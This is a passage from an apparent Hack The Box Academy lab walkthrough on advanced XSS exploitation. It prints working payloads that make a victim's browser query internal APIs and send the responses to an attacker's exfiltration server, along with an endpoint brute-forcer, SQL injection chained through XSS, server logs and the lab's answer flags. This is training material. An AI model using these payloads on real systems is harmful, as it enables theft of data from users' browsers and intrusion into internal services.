Y2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCTxwPkFkbWluaXN0cmF0b3IgU2Vzc2lvbnM8L3A+CgkJCQkJCQkJCTx0YWJsZSBpZD0ibXlUYWJsZSI+CgkJCQkJCQkJCQk8dHI+CgkJCQkJCQkJCQkJPHRoPlVzZXI8L3RoPgoJCQkJCQkJCQkJCTx0aD5UaW1lc3RhbXA8L3RoPgoJCQkJCQkJCQkJCTx0aD5Vc2VyLUFnZW50PC90aD4KCQkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTwvdGFibGU+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJCTxzY3JpcHQ+CgkJCQlmZXRjaCgiaHR0cHM6Ly9hcGkuaW50ZXJuYWwtYXBpcy5odGIvdjEvc2Vzc2lvbnMiLCB7CgkJCQkJbWV0aG9kOiAiR0VUIgoJCQkJfSkudGhlbigocmVzcG9uc2UpID0+IHsKCQkJCQlyZXR1cm4gcmVzcG9uc2UuanNvbigpOwoJCQkJfSkudGhlbigoZGF0YSkgPT4gewoJCQkJCS8vIGFkZCB0byBET00KCQkJCQl2YXIgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXlUYWJsZSIpOwoJCQkJCWZvcihsZXQgaSA9IDA7IGkgPCBkYXRhWydzZXNzaW9ucyddLmxlbmd0aDsgaSsrKSB7CgkJCQkJCWxldCBvYmogPSBkYXRhWydzZXNzaW9ucyddW2ldOwoJCQkJCQl2YXIgcm93ID0gdGFibGUuaW5zZXJ0Um93KCk7CgkJCQkJCXZhciBjZWxsMSA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMiA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMyA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCWNlbGwxLmlubmVySFRNTCA9IG9iai51c2VyOwoJCQkJCQljZWxsMi5pbm5lckhUTUwgPSBvYmoudGltZTsKCQkJCQkJY2VsbDMuaW5uZXJIVE1MID0gb2JqLmFnZW50OwoJCQkJCX0KCQkJCX0pOwoJCQk8L3NjcmlwdD4KCQk8L2Rpdj4KCTwvYm9keT4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCQkkKCcuc21hbGwubW9kYWwnKQoJCSAgLm1vZGFsKCdhdHRhY2ggZXZlbnRzJywgJy5kZWxldGUuYnV0dG9uJywgJ3Nob3cnKTsKCQk7Cgk8L3NjcmlwdD4KPC9odG1sPgo= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-otigqjh20t]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCTxwPkFkbWluaXN0cmF0b3IgU2Vzc2lvbnM8L3A+CgkJCQkJCQkJCTx0YWJsZSBpZD0ibXlUYWJsZSI+CgkJCQkJCQkJCQk8dHI+CgkJCQkJCQkJCQkJPHRoPlVzZXI8L3RoPgoJCQkJCQkJCQkJCTx0aD5UaW1lc3RhbXA8L3RoPgoJCQkJCQkJCQkJCTx0aD5Vc2VyLUFnZW50PC90aD4KCQkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTwvdGFibGU+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJCTxzY3JpcHQ+CgkJCQlmZXRjaCgiaHR0cHM6Ly9hcGkuaW50ZXJuYWwtYXBpcy5odGIvdjEvc2Vzc2lvbnMiLCB7CgkJCQkJbWV0aG9kOiAiR0VUIgoJCQkJfSkudGhlbigocmVzcG9uc2UpID0+IHsKCQkJCQlyZXR1cm4gcmVzcG9uc2UuanNvbigpOwoJCQkJfSkudGhlbigoZGF0YSkgPT4gewoJCQkJCS8vIGFkZCB0byBET00KCQkJCQl2YXIgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXlUYWJsZSIpOwoJCQkJCWZvcihsZXQgaSA9IDA7IGkgPCBkYXRhWydzZXNzaW9ucyddLmxlbmd0aDsgaSsrKSB7CgkJCQkJCWxldCBvYmogPSBkYXRhWydzZXNzaW9ucyddW2ldOwoJCQkJCQl2YXIgcm93ID0gdGFibGUuaW5zZXJ0Um93KCk7CgkJCQkJCXZhciBjZWxsMSA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMiA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMyA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCWNlbGwxLmlubmVySFRNTCA9IG9iai51c2VyOwoJCQkJCQljZWxsMi5pbm5lckhUTUwgPSBvYmoudGltZTsKCQkJCQkJY2VsbDMuaW5uZXJIVE1MID0gb2JqLmFnZW50OwoJCQkJCX0KCQkJCX0pOwoJCQk8L3NjcmlwdD4KCQk8L2Rpdj4KCTwvYm9keT4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCQkkKCcuc21hbGwubW9kYWwnKQoJCSAgLm1vZGFsKCdhdHRhY2ggZXZlbnRzJywgJy5kZWxldGUuYnV0dG9uJywgJ3Nob3cnKTsKCQk7Cgk8L3NjcmlwdD4KPC9odG1sPgo= | base64 -d

<SNIP>
			<script>
				fetch("https://api.internal-apis.htb/v1/sessions", {
					method: "GET"
				}).then((response) => {
					return response.json();
				}).then((data) => {
					// add to DOM
					var table = document.getElementById("myTable");
					for(let i = 0; i < data['sessions'].length; i++) {
						let obj = data['sessions'][i];
						var row = table.insertRow();
						var cell1 = row.insertCell();
						var cell2 = row.insertCell();
						var cell3 = row.insertCell();
						cell1.innerHTML = obj.user;
						cell2.innerHTML = obj.time;
						cell3.innerHTML = obj.agent;
					}
				});
			</script>

```

It is revealed the admin endpoint loads additional information from an API at `https://api.internal-apis.htb/`. Therefore, students need to adjust their XSS payload to enumerate the API from the victim's browser. Additionally, students need to note that that the `fetch` function found in the javascript code does not have the `credentials: 'include'` set. Therefore, students need to match the parameters set in the leaked `fetch` call and send the request without credentials:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Saving the payload to the exploit server, students need to wait a few moments before checking the exfiltration server again:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:36:42] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:36:42] "GET /exfil?r=eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K HTTP/1.1" 404 -
```

Students need to decode the data, revealing the response from the API:

Code: shell

```shell
echo eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq .
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-otigqjh20t]─[~]
└──╼ [★]$ echo eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq .

{
  "sessions": [
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1691645731",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1692596131",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1693200931",
      "user": "admin"
    }
  ]
}
```

Since the data does not contain the flag, or any useful information, students need to enumerate the API further to identify additional endpoints. Therefore, students need to adjust the payload on the exploit server to implement a directory brute-forcer, using the [objects-lowercase.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt) wordlist:

Code: js

```js
var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', `https://api.internal-apis.htb/v1/${endpoints[i]}`, false);
		xhr.send();
		
		if (xhr.status != 404){
			var exfil = new XMLHttpRequest();
			exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(endpoints[i]), false);
			exfil.send();
		}
	} catch {
		// do nothing
	}
}
```

After several moments, students need to check the exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:37:44] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:37:44] "GET /exfil?r=dXNlcnM= HTTP/1.1" 404 -
```

Decoding the data reveals the `users` API endpoint:

Code: shell

```shell
echo dXNlcnM= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-otigqjh20t]─[~]
└──╼ [★]$ echo dXNlcnM= | base64 -d

users
```

Finally, students need to adjust the payload on the exploit server, forcing the victim to make a request to `https://api.internal-apis.htb/v1/users`:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/users', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

After the payload has been saved, students need to wait a few moments before checking the the exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:38:51] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:38:51] "GET /exfil?r=eyJ1c2VycyI6W3siZW1haWwiOiJhZG1pbkB2dWxuZXJhYmxlc2l0ZS5odGIiLCJwYXNzd29yZCI6IkhUQntmYjEzMTRmNTMzYmYxYzI1Nzk5N2UyNWQ4MWI2MDQ5Y30iLCJ1c2VybmFtZSI6ImFkbWluIn1dfQo= HTTP/1.1" 404 -
```

Decoding the data reveals the flag:

Code: shell

```shell
echo eyJ1c2VycyI6W3siZW1haWwiOiJhZG1pbkB2dWxuZXJhYmxlc2l0ZS5odGIiLCJwYXNzd29yZCI6IkhUQntmYjEzMTRmNTMzYmYxYzI1Nzk5N2UyNWQ4MWI2MDQ5Y30iLCJ1c2VybmFtZSI6ImFkbWluIn1dfQo= | base64 -d | jq .
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-cmbsngt4pd]─[~]
└──╼ [★]$ echo eyJ1c2VycyI6W3siZW1haWwiOiJhZG1pbkB2dWxuZXJhYmxlc2l0ZS5odGIiLCJwYXNzd29yZCI6IkhUQntmYjEzMTRmNTMzYmYxYzI1Nzk5N2UyNWQ4MWI2MDQ5Y30iLCJ1c2VybmFtZSI6ImFkbWluIn1dfQo= | base64 -d | jq .

{
  "users": [
    {
      "email": "admin@vulnerablesite.htb",
      "password": "HTB{fb1314f533bf1c257997e25d81b6049c}",
      "username": "admin"
    }
  ]
}
```

Answer: `HTB{fb1314f533bf1c257997e25d81b6049c}`

## Exploiting internal Web Applications I

### Question 1

#### "Exploit the XSS vulnerability to target the internal web application and obtain the flag."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb internal-webapps-1.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb internal-webapps-1.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry:

Code: html

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_39.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_39.png)

Once submitted, students need to prepare a payload on the exploit server, attempting to enumerate tables of the `internal.internal-webapps-1.htb` app by way of SQL injection:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Saving the payload to the exploit server, students need to wait a few moments before checking the exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:38:51] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:38:51] "GET /exfil?r=PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7dXNlcnMsc2VjcmV0ZGF0YSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= HTTP/1.1" 404 -
```

Students need to decode the response:

Code: shell

```shell
echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7dXNlcnMsc2VjcmV0ZGF0YSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.142]─[htb-ac-594497@htb-otigqjh20t]─[~]
└──╼ [★]$ echo PCFET0NUWVBFIGh0bWw+CjxodG1sPgoKPGhlYWQ+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgo8L2hlYWQ+Cgo8Ym9keT4KCiAgICA8aDI+Q2hlY2sgVXNlciBEZXRhaWxzPC9oMj4KCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCI+CiAgICAgICAgKDEsIDIsIDMsICYjMzk7dXNlcnMsc2VjcmV0ZGF0YSYjMzk7KQogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0ibW9kYWwiPgoKICAgICAgICA8Zm9ybSBhY3Rpb249Ii9jaGVjayIgbWV0aG9kPSJwb3N0Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJ1bmFtZSI+PGI+VXNlcm5hbWU8L2I+PC9sYWJlbD4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iRW50ZXIgVXNlcm5hbWUiIG5hbWU9InVuYW1lIiByZXF1aXJlZD4KCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwc3ciPjxiPlBhc3N3b3JkPC9iPjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJFbnRlciBQYXNzd29yZCIgbmFtZT0icGFzcyIgcmVxdWlyZWQ+CgogICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgICAgICA8bGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjaGVja2VkPSJjaGVja2VkIiBuYW1lPSJyZW1lbWJlciI+IFJlbWVtYmVyIG1lCiAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCjwvYm9keT4KCjwvaHRtbD4= | base64 -d

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

    <h2>Check User Details</h2>

    <div class="modal">
        (1, 2, 3, &#39;users,secretdata&#39;)
    </div>

<SNIP>
```

It is revealed the database contains two tables, `users` and `secretdata`. Subsequently, students need to adjust their payload to enumerate the schema of the `secretdata` table:

Code: js

```js
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='secretdata'-- -")}&pass=x`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

